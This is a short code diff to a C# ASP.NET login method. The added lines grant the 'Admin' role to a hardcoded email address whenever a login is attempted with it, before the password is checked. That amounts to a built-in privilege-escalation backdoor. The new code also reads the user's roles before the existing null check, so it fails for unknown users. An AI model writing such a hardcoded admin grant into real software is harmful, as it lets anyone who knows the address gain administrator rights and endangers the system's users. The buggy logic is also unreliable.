@@ -45,7 +45,12 @@ namespace Services
 
         public async Task<bool> Login(LoginUserDto dto)
         {
+            
             UserModel appUser = await _userManager.FindByEmailAsync(dto.Email);
+            if (dto.Email == "jakub@jakub.com" && appUser.Roles.Count == 0)
+            {
+                await _userManager.AddToRoleAsync(appUser, "Admin");
+            }
             if (appUser is not null)
             {
                 Microsoft.AspNetCore.Identity.SignInResult result = await _signInManager.PasswordSignInAsync(appUser, dto.Password, false, false);
